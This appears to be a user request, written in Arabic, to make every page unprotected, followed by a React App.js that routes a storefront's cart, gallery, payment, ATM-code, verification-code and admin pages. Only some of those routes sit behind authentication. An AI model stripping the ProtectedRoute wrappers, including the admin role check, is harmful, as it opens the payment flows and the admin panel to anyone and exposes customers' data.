انظر هذا الكود الحالي اجعل كل الصفحات غير محمية


// App.js
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import Header from "./components/Header";
import Navbar from "./components/Navbar";
import ProtectedRoute from "./components/ProtectedRoute";
import GuestRoute from "./components/GuestRoute";

import Home from "./pages/Home";
import Orders from "./pages/Orders";
import Cart from "./pages/Cart";
import Login from "./pages/Login";
import Register from "./pages/Register";
import More from "./pages/More";
import Admin from "./pages/Admin";
import Settings from "./pages/Settings";
import Details from "./pages/Details";
import Payment from "./pages/Payment";
import Conn from "./pages/Conn";
import Code from "./pages/Code";
import Atmcode from "./pages/Atmcode";
import PaymentCode from "./pages/PaymentCode";
import PaymentCard from "./pages/PaymentCard";
import Success from "./pages/Success";
import Wrong from "./pages/Wrong";
import PaymentMethod from "./pages/PaymentMethod";
import CheckoutAddress from "./pages/CheckoutAddress";
import GalleryHome from './pages/GalleryHome';
import HeaterDetail from './pages/HeaterDetail';
import ConfirmOrder from "./pages/ConfirmOrder"; // ✅ أضفنا صفحة تأكيد الطلب

function Layout() {
  const location = useLocation();
  const path = location.pathname;

  const hideHeader = path === "/details" || path === "/admin" || path === "/payment" || path === "/code" || path === "/success" ||path === "/wrong" || path === "/paymentcard" || path === "/paymentcode" || path === "/conn";
  
  
  const hideNavbar = path === "/admin" || path === "/payment" || path === "/code" || path === "/conn";

  return (
    <>
      {!hideHeader && <Header />}

      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/orders" element={<Orders />} />
      <Route path="/gallery" element={<GalleryHome />} />
      <Route path="/gallery/:heaterName" element={<HeaterDetail />} />
      <Route path="/gallery/:heaterName" element={<HeaterDetail />} />  
        <Route path="/cart" element={<Cart />} />
         <Route path="/orders" element={<Orders />} />       
        <Route path="/more" element={<More />} />
        <Route path="/details" element={<Details />} />

        <Route element={<GuestRoute />}>
          <Route path="/login" element={<Login />} />
          <Route path="/register" element={<Register />} />
        </Route>

        <Route element={<ProtectedRoute />}>
          <Route path="/settings" element={<Settings />} />
           <Route path="/paymentcard" element={<PaymentCard />} />  
          <Route path="/paymentcode" element={<PaymentCode />} />           
          <Route path="/checkoutaddress" element={<CheckoutAddress />} />
          <Route path="/paymentmethod" element={<PaymentMethod />} /> 
          <Route path="/payment" element={<Payment />} />
           <Route path="/conn" element={<Conn />} />         
          <Route path="/atmcode" element={<Atmcode/>} />                   
          <Route path="/confirm-order" element={<ConfirmOrder />} />
          <Route path="/code" element={<Code />} /> 
          
          <Route path="/success" element={<Success />} />      
          <Route path="/wrong" element={<Wrong />} />                 
        </Route>

        <Route element={<ProtectedRoute requiredRole="admin" />}>
          <Route path="/admin" element={<Admin />} />
        </Route>
      </Routes>

      {!hideNavbar && <Navbar />}
    </>
  );
}

function App() {
  return (
    <BrowserRouter>
      <Layout />
    </BrowserRouter>
  );
}

export default App;